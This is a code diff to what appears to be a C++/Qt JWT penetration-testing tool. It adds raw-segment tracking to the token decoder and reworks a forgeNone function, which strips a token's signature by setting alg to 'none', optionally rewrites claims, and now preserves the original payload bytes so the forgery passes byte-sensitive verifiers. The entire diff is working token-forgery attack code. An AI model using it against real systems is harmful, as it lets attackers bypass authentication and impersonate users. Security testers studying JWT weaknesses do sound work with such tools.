@@ -67,7 +67,9 @@ Decoded decode(const QString &token) {
     d.typ = d.header.value("typ").toString();
     d.kid = d.header.value("kid").toString();
     if (parts.size() >= 3) d.signature = b64urlDecode(parts[2]);
-    d.signingInput = (parts[0] + "." + parts[1]).toUtf8();
+    d.signingInput  = (parts[0] + "." + parts[1]).toUtf8();
+    d.rawHeaderB64  = parts[0];
+    d.rawPayloadB64 = parts[1];
     d.ok = true;
     return d;
 }
@@ -214,13 +216,22 @@ QString signHmac(const QJsonObject &header,
 QString forgeNone(const Decoded &d, const QJsonObject &claimOverrides) {
     QJsonObject header = d.header;
     header["alg"] = "none";
-    QJsonObject payload = d.payload;
-    for (auto it = claimOverrides.begin(); it != claimOverrides.end(); ++it)
-        payload[it.key()] = it.value();
     const QByteArray hb = QJsonDocument(header).toJson(QJsonDocument::Compact);
-    const QByteArray pb = QJsonDocument(payload).toJson(QJsonDocument::Compact);
+
+    // Preserve the ORIGINAL payload segment byte-for-byte when no claim is
+    // overridden, so the forge survives an order/byte-sensitive verifier; only
+    // re-serialize (which reorders the QJsonObject's keys) when overrides force it.
+    QString payloadSeg;
+    if (claimOverrides.isEmpty() && !d.rawPayloadB64.isEmpty()) {
+        payloadSeg = d.rawPayloadB64;
+    } else {
+        QJsonObject payload = d.payload;
+        for (auto it = claimOverrides.begin(); it != claimOverrides.end(); ++it)
+            payload[it.key()] = it.value();
+        payloadSeg = b64urlEncode(QJsonDocument(payload).toJson(QJsonDocument::Compact));
+    }
     // Trailing dot, empty signature -- the alg:none wire format.
-    return b64urlEncode(hb) + "." + b64urlEncode(pb) + ".";
+    return b64urlEncode(hb) + "." + payloadSeg + ".";
 }
 
 } // namespace Nullock::Core::JwtTool
